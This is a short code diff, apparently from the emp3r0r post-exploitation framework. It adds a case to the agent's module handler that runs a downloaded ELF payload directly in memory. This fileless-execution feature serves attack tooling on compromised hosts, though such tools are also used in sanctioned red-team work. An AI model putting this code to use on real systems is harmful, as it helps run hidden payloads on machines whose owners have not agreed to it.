@@ -12,6 +12,7 @@ import (
 
 	"github.com/jm33-m0/arc"
 	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
+	"github.com/jm33-m0/emp3r0r/core/lib/exe_utils"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
@@ -82,6 +83,13 @@ func moduleHandler(download_addr, file_to_download, payload_type, modName, check
 			}
 			return out
 		}
+	case "elf":
+		out = "Successfully executed ELF binary in memory"
+		err = exe_utils.ELFRun(payload_data, fields, env)
+		if err != nil {
+			out = fmt.Sprintf("running ELF binary in memory: %v", err)
+		}
+		return out
 	default:
 		// on disk modules
 		args = fields[1:]
